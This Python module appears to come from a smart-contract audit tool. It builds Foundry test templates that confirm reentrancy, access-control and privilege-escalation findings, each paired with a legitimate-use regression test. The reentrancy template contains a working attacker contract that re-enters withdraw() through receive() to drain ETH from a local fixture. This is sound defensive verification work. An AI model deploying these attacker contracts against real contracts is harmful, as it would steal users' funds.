"""Controlled Foundry test templates.

The LLM (or heuristic layer) may only supply structured parameters that fill the
placeholders below. It never provides raw test code and never provides shell commands.
Each template asserts a concrete, checkable property so the result is unambiguous.

Assertion messages that mean "the security property was NOT violated" start with
NOT_REPRODUCED_MARKER. Any other failure is a broken fixture or an unrelated revert,
which the runner reports as ERROR / INCONCLUSIVE rather than as evidence either way.
"""

import re
from dataclasses import dataclass, field

from slither.tools.workbench.models import Finding, SourceRef

FORGE_STD_REMAPPING = "forge-std/=lib/forge-std/src/"
NOT_REPRODUCED_MARKER = "AUDITLENS_EXPLOIT_NOT_REPRODUCED"
UNDETERMINED_MARKER = "AUDITLENS_UNDETERMINED"
ESCALATION_DETECTOR = "auditlens-privilege-escalation"


@dataclass
class ExploitTemplate:
    name: str
    params: dict[str, str]
    source: str
    test_contract: str
    test_function: str
    asserted_property: str
    test_file: str = "test/Exploit.t.sol"
    exercised_key: str | None = None
    limitations: list[str] = field(default_factory=list)


@dataclass
class RegressionTemplate:
    name: str
    source: str
    test_contract: str
    test_function: str
    asserted_property: str
    test_file: str = "test/LegitimateUse.t.sol"


REENTRANCY_TEMPLATE = """// SPDX-License-Identifier: MIT
pragma solidity {pragma};

import "forge-std/Test.sol";
import {{{contract}}} from "{import_path}";

contract Attacker {{
    {contract} public target;
    uint256 public reentryAttempts;
    uint256 public reentrySuccesses;
    uint256 public constant MAX_DEPTH = {max_depth};
    uint256[] internal snapshots;

    constructor({contract} _t) payable {{ target = _t; }}

    function attack() external {{
        target.{deposit_fn}{{value: {deposit_wei}}}();
        target.{withdraw_fn}();
    }}

    function timeline() external view returns (uint256[] memory) {{
        return snapshots;
    }}

    receive() external payable {{
        snapshots.push(address(target).balance);
        if (reentryAttempts < MAX_DEPTH && address(target).balance >= {deposit_wei}) {{
            reentryAttempts++;
            try target.{withdraw_fn}() {{
                reentrySuccesses++;
            }} catch {{}}
        }}
    }}
}}

contract ReentrancyTest is Test {{
    {contract} target;
    Attacker attacker;
    address victim = address(0xA11CE);

    function setUp() public {{
        target = new {contract}();
        vm.deal(victim, {seed_wei});
        vm.prank(victim);
        target.{deposit_fn}{{value: {seed_wei}}}();
        attacker = new Attacker{{value: {deposit_wei}}}(target);
    }}

    function testReentrancy() public {{
        uint256 contractBefore = address(target).balance;
        uint256 attackerBefore = address(attacker).balance;
        attacker.attack();
        uint256 contractAfter = address(target).balance;
        uint256 attackerAfter = address(attacker).balance;
        uint256 gained = attackerAfter > attackerBefore ? attackerAfter - attackerBefore : 0;
        emit log_named_uint("contract_balance_before", contractBefore);
        emit log_named_uint("contract_balance_after", contractAfter);
        emit log_named_uint("attacker_balance_before", attackerBefore);
        emit log_named_uint("attacker_balance_after", attackerAfter);
        emit log_named_uint("attacker_gained_wei", gained);
        emit log_named_uint("attacker_deposit_wei", {deposit_wei});
        emit log_named_uint("victim_deposit_wei", {seed_wei});
        emit log_named_uint("reentry_attempts", attacker.reentryAttempts());
        emit log_named_uint("reentry_successes", attacker.reentrySuccesses());
        uint256[] memory steps = attacker.timeline();
        uint256[] memory series = new uint256[](steps.length + 2);
        series[0] = contractBefore;
        for (uint256 i = 0; i < steps.length; i++) {{
            series[i + 1] = steps[i];
        }}
        series[steps.length + 1] = contractAfter;
        emit log_named_array("contract_balance_timeline", series);
        assertGt(attackerAfter, attackerBefore,
            "{marker}: attacker did not extract more ETH than it deposited");
    }}
}}
"""

LEGITIMATE_USE_TEMPLATE = """// SPDX-License-Identifier: MIT
pragma solidity {pragma};

import "forge-std/Test.sol";
import {{{contract}}} from "{import_path}";

contract LegitimateUseTest is Test {{
    {contract} target;
    address alice = address(0xA11CE);
    address bob = address(0xB0B);

    function setUp() public {{
        target = new {contract}();
        vm.deal(alice, 10 ether);
        vm.deal(bob, 10 ether);
    }}

    function testDepositWithdrawRoundTrip() public {{
        vm.prank(alice);
        target.{deposit_fn}{{value: 2 ether}}();
        vm.prank(bob);
        target.{deposit_fn}{{value: 3 ether}}();
        vm.prank(alice);
        target.{withdraw_fn}();
        assertEq(alice.balance, 10 ether, "alice did not recover her deposit");
        assertEq(address(target).balance, 3 ether, "remaining balance does not match bob's deposit");
        vm.prank(bob);
        target.{withdraw_fn}();
        assertEq(bob.balance, 10 ether, "bob did not recover his deposit");
        assertEq(address(target).balance, 0, "contract kept funds after all withdrawals");
    }}
}}
"""

ACCESS_CONTROL_TEMPLATE = """// SPDX-License-Identifier: MIT
pragma solidity {pragma};

import "forge-std/Test.sol";
import {{{contract}}} from "{import_path}";

contract AccessControlTest is Test {{
    {contract} target;
    address attacker = address(0xBAD);

    function setUp() public {{
        target = new {contract}();
    }}

    function testUnauthorizedCall() public {{
        vm.prank(attacker);
        (bool ok, ) = address(target).call(abi.encodeWithSignature("{signature}"{call_args}));
        emit log_named_uint("unauthorized_call_succeeded", ok ? 1 : 0);
        assertTrue(ok,
            "{undetermined}: call reverted (access check or unmet precondition)");
    }}
}}
"""

ESCALATION_TEMPLATE = """// SPDX-License-Identifier: MIT
pragma solidity {pragma};

import "forge-std/Test.sol";
import {{{contract}}} from "{import_path}";

contract PrivilegeEscalationTest is Test {{
    {contract} target;
    address attacker = address(0xBAD);

    receive() external payable {{}}

    function setUp() public {{
        target = new {contract}();
        vm.deal(address(target), {funds_wei});
    }}

    function testPrivilegeEscalation() public {{
        vm.prank(attacker);
        (bool before, ) = address(target).call(abi.encodeWithSignature("{privileged_sig}"{privileged_args}));
        emit log_named_uint("privileged_call_before_escalation", before ? 1 : 0);
        assertFalse(before,
            "{undetermined}: {privileged_sig} is callable without escalation; the guard is not effective");
        emit log_named_uint("escalation_attempted", 1);

        uint256 contractBefore = address(target).balance;
        uint256 attackerBefore = attacker.balance;
        vm.prank(attacker);
        (bool escalated, ) = address(target).call(abi.encodeWithSignature("{writer_sig}"{writer_args}));
        emit log_named_uint("escalation_call_succeeded", escalated ? 1 : 0);

        vm.prank(attacker);
        (bool afterEscalation, ) = address(target).call(abi.encodeWithSignature("{privileged_sig}"{privileged_args}));
        emit log_named_uint("privileged_call_after_escalation", afterEscalation ? 1 : 0);
        emit log_named_uint("contract_balance_before", contractBefore);
        emit log_named_uint("contract_balance_after", address(target).balance);
        emit log_named_uint("attacker_balance_before", attackerBefore);
        emit log_named_uint("attacker_balance_after", attacker.balance);
        assertTrue(afterEscalation,
            "{marker}: {privileged_sig} still reverts for the attacker after calling {writer_sig}");
    }}
}}
"""

LEGITIMATE_OWNER_TEMPLATE = """// SPDX-License-Identifier: MIT
pragma solidity {pragma};

import "forge-std/Test.sol";
import {{{contract}}} from "{import_path}";

contract LegitimateOwnerTest is Test {{
    {contract} target;
    address newOwner = address(0xCAFE);

    receive() external payable {{}}

    function setUp() public {{
        target = new {contract}();
        vm.deal(address(target), {funds_wei});
    }}

    function testOwnerCanHandOverRole() public {{
        (bool handedOver, ) = address(target).call(abi.encodeWithSignature("{writer_sig}"{owner_args}));
        assertTrue(handedOver, "the deployer could not call {writer_sig}");
        vm.prank(newOwner);
        (bool used, ) = address(target).call(abi.encodeWithSignature("{privileged_sig}"{privileged_args}));
        assertTrue(used, "the new role holder could not call {privileged_sig}");
    }}
}}
"""


def _pragma(finding: Finding, sources: dict[str, str]) -> str:
    file = finding.location.file if finding.location else ""
    source = sources.get(file, "")
    for line in source.splitlines():
        if line.strip().startswith("pragma solidity"):
            return line.strip().removeprefix("pragma solidity").strip().rstrip(";")
    return "^0.8.0"


def _payable_no_arg_fn(name: str, sources: dict[str, str]) -> bool:
    pattern = re.compile(rf"function\s+{re.escape(name)}\s*\(\s*\)[^{{;]*\bpayable\b")
    return any(pattern.search(code) for code in sources.values())


def _bank_params(finding: Finding, sources: dict[str, str]) -> dict[str, str] | None:
    """Parameters shared by the reentrancy exploit and its legitimate-use regression test."""
    ev = finding.evidence
    if finding.detector != "reentrancy-eth" or ev is None or ev.signature != f"{ev.name}()":
        return None
    deposit_fn = next(
        (n for n in ("deposit", "depositEth", "fund") if _payable_no_arg_fn(n, sources)), None
    )
    if deposit_fn is None:
        return None
    return {
        "pragma": _pragma(finding, sources),
        "contract": ev.contract,
        "import_path": _import_path(finding),
        "deposit_fn": deposit_fn,
        "withdraw_fn": ev.name,
    }


def reentrancy_template(finding: Finding, sources: dict[str, str]) -> ExploitTemplate | None:
    params = _bank_params(finding, sources)
    if params is None:
        return None
    params |= {
        "deposit_wei": "1 ether",
        "seed_wei": "5 ether",
        "max_depth": "5",
        "marker": NOT_REPRODUCED_MARKER,
    }
    return ExploitTemplate(
        name="reentrancy",
        params=params,
        source=REENTRANCY_TEMPLATE.format(**params),
        test_contract="ReentrancyTest",
        test_function="testReentrancy",
        asserted_property=(
            f"An attacker contract that deposits 1 ETH and re-enters {params['withdraw_fn']}() "
            "from its receive() ends with more ETH than it started with."
        ),
        exercised_key="reentry_attempts",
        limitations=[
            "Single local fixture: one honest depositor (5 ETH) and one attacker (1 ETH).",
            "Assumes deposit()/withdraw() follow per-depositor accounting.",
            "Amounts are fixture values, not on-chain balances.",
        ],
    )


def legitimate_use_template(finding: Finding, sources: dict[str, str]) -> RegressionTemplate | None:
    params = _bank_params(finding, sources)
    if params is None:
        return None
    return RegressionTemplate(
        name="deposit-withdraw-round-trip",
        source=LEGITIMATE_USE_TEMPLATE.format(**params),
        test_contract="LegitimateUseTest",
        test_function="testDepositWithdrawRoundTrip",
        asserted_property=(
            f"Two honest users can {params['deposit_fn']}() and {params['withdraw_fn']}() "
            "and each recovers exactly their deposit."
        ),
    )


def _related(finding: Finding, role: str) -> SourceRef | None:
    return next((r for r in finding.related if r.role == role), None)


def _no_arg_constructor(finding: Finding, sources: dict[str, str]) -> bool:
    """The templates deploy with `new Contract()`; constructor arguments are not synthesized."""
    source = sources.get(finding.location.file if finding.location else "", "")
    return all(not args.strip() for args in re.findall(r"constructor\s*\(([^)]*)\)", source))


def _escalation_params(finding: Finding, sources: dict[str, str]) -> dict[str, str] | None:
    """Parameters shared by the escalation exploit and its legitimate-owner regression test."""
    ev = finding.evidence
    privileged = _related(finding, "privileged_function")
    if finding.detector != ESCALATION_DETECTOR or ev is None or privileged is None:
        return None
    if not _no_arg_constructor(finding, sources):
        return None

    def args(signature: str, address: str) -> str:
        values = _default_args(signature, address)
        return f", {values}" if values else ""

    return {
        "pragma": _pragma(finding, sources),
        "contract": ev.contract,
        "import_path": _import_path(finding),
        "writer_sig": ev.signature,
        "writer_args": args(ev.signature, "attacker"),
        "owner_args": args(ev.signature, "newOwner"),
        "privileged_sig": privileged.label,
        "privileged_args": args(privileged.label, "attacker"),
        "funds_wei": "5 ether",
    }


def escalation_template(finding: Finding, sources: dict[str, str]) -> ExploitTemplate | None:
    params = _escalation_params(finding, sources)
    if params is None:
        return None
    params |= {"marker": NOT_REPRODUCED_MARKER, "undetermined": UNDETERMINED_MARKER}
    guard = _related(finding, "guard_variable")
    return ExploitTemplate(
        name="privilege-escalation",
        params=params,
        source=ESCALATION_TEMPLATE.format(**params),
        test_contract="PrivilegeEscalationTest",
        test_function="testPrivilegeEscalation",
        asserted_property=(
            f"{params['privileged_sig']} reverts for an arbitrary address, but succeeds for "
            f"the same address with the same arguments after it calls {params['writer_sig']}"
            + (f" (which overwrites `{guard.label}`)." if guard else ".")
        ),
        exercised_key="escalation_attempted",
        limitations=[
            "Differential test: the only change between the two privileged calls is the "
            "attacker's call to the writer, so the revert before is attributed to the guard.",
            "Arguments are fixed placeholder values; the target holds 5 ETH of fixture funds.",
            "The contract is deployed with a no-argument constructor by the test contract.",
        ],
    )


def legitimate_owner_template(
    finding: Finding, sources: dict[str, str]
) -> RegressionTemplate | None:
    params = _escalation_params(finding, sources)
    if params is None:
        return None
    return RegressionTemplate(
        name="legitimate-role-handover",
        source=LEGITIMATE_OWNER_TEMPLATE.format(**params),
        test_contract="LegitimateOwnerTest",
        test_function="testOwnerCanHandOverRole",
        asserted_property=(
            f"The deployer can call {params['writer_sig']} to hand the role to a new address, "
            f"and that address can then call {params['privileged_sig']}."
        ),
    )


def access_control_template(finding: Finding, sources: dict[str, str]) -> ExploitTemplate | None:
    ev = finding.evidence
    if ev is None or ev.is_protected:
        return None
    args = _default_args(ev.signature)
    params = {
        "pragma": _pragma(finding, sources),
        "contract": ev.contract,
        "import_path": _import_path(finding),
        "signature": ev.signature,
        "call_args": f", {args}" if args else "",
        "undetermined": UNDETERMINED_MARKER,
    }
    return ExploitTemplate(
        name="access-control",
        params=params,
        source=ACCESS_CONTROL_TEMPLATE.format(**params),
        test_contract="AccessControlTest",
        test_function="testUnauthorizedCall",
        asserted_property=f"An arbitrary address can call {ev.signature} without it reverting.",
        limitations=[
            "Arguments are fixed placeholder values; a revert may come from an unmet "
            "precondition rather than an access check, so a revert is reported as inconclusive.",
        ],
    )


def _import_path(finding: Finding) -> str:
    return f"src/{finding.location.file.split('/')[-1]}" if finding.location else "src/Target.sol"


def _default_args(signature: str, address: str = "attacker") -> str:
    inside = signature[signature.find("(") + 1 : signature.rfind(")")]
    if not inside:
        return ""
    args = []
    for raw in inside.split(","):
        base = raw.strip().split()[0]
        if base.startswith(("uint", "int")):
            args.append(f"{base}(1)")
        elif base == "address":
            args.append(address)
        elif base == "bool":
            args.append("true")
        elif base == "bytes" or base == "string":
            args.append('""')
        elif base.startswith("bytes"):
            args.append(f"{base}(0)")
        else:
            args.append("0")
    return ", ".join(args)


TEMPLATE_BUILDERS = {
    "reentrancy": reentrancy_template,
    "access-control": access_control_template,
}
DETECTOR_TEMPLATE_BUILDERS = {ESCALATION_DETECTOR: escalation_template}
REGRESSION_BUILDERS = {
    "reentrancy-eth": legitimate_use_template,
    ESCALATION_DETECTOR: legitimate_owner_template,
}


def build_template(finding: Finding, sources: dict[str, str]) -> ExploitTemplate | None:
    builder = DETECTOR_TEMPLATE_BUILDERS.get(finding.detector) or TEMPLATE_BUILDERS.get(
        finding.category or ""
    )
    return builder(finding, sources) if builder else None


def regression_template(finding: Finding, sources: dict[str, str]) -> RegressionTemplate | None:
    builder = REGRESSION_BUILDERS.get(finding.detector)
    return builder(finding, sources) if builder else None
